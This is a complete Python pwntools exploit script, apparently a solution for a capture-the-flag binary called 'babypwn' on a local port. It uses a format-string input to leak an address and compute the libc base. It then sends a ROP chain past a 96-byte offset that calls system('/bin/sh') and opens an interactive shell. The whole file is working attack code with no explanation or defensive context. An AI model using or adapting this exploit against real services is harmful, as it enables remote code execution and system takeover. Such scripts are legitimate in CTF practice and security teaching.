#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('./babypwn')
libc = ELF('./libc.so.6')

#context.log_level = 'debug'

io = remote('127.0.0.1', 9002)
print(io.recvuntil(b"name?\n"))

io.sendline(b'%p%p')
data = io.recvline()
print(data)

data = data.replace(b"Hi, ", b"")
data = data.replace(b"(nil)", b"")
leak = int(data, 16)
print(f"leak: {hex(leak)}")

libc_base = leak + 0x1440
libc.address = libc_base

print(f"libc_addr @ {hex(libc.address)}")

print(io.recvuntil(b"?\n"))

rop = ROP(libc)
rop.call(rop.ret)
rop.system(next(libc.search(b"/bin/sh")))

io.sendline(flat({96: rop.chain()}))

io.interactive()